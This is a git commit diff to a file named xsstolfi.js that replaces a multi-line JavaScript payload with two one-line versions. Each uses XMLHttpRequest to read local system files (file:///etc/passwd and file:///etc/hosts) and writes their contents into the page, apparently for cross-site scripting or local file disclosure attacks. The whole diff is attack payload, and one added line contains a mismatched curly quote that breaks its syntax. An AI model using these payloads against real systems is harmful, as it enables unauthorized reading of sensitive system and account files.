54b1612542e776487cd333be62b013bf39da477d
az7rb <54269260+az7rb@users.noreply.github.com>
2021-09-29 18:55:25 +0300

    Update xsstolfi.js

--- xsstolfi.js
+++ xsstolfi.js
@@ -1,6 +1,2 @@
-x=new XMLHttpRequest;
-x.onload=function(){
-document.write(this.responseText)
-};
-x.open("GET","file:///etc/passwd");
-x.send();
+x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open('GET','file:///etc/hosts');x.send();
+x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(‘GET','file:///etc/passwd');x.send();
